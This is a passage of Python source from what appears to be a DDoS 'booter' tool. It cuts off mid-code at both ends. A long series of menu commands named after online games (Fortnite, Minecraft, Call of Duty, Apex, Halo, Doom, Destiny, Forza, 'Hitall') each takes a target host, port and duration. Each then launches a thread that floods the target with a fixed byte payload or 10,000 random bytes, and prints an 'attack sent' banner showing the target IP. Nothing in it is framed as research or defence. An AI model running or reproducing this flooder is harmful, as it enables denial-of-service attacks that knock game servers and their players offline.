\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitev2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [FORTNITEV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "minecraftV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [MINECRAFTV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "minecraftV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [MINECRAFTV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "CodV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [CODV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "CodV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [CODV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ApexV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [APEXV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ApexV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [APEXV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "HaloV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [HALOV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "HaloV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [HALOV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "DoomV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [DOOMV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "DoomV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [DOOMV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "DestinyV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [DESTINYV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "DestinyV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [DESTINY]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ForzaV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [FORZAV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ForzaV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [FORZAV2]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
		elif sinput == "HitallV1":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [HITALLV1]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "HitallV2":
			try:
				if running >= 100000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
